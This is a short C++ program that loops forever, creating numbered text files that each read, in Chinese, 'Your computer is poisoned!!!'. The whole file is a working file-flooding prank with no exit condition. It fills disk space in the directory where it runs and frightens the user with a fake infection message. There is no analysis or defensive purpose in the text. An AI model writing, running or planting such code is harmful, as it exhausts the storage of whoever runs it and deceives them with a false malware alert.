#include <iostream>
#include <fstream>
#include <sstream>
using namespace std;

int main() {

	int x = 0;

	for (;;) {

		x = x + 1;

		ofstream outFile;

		outFile.open(to_string(x) + ".txt");

		outFile << "你的电脑中毒了！！！" << endl;

		outFile.close();
	}

	return 0;
}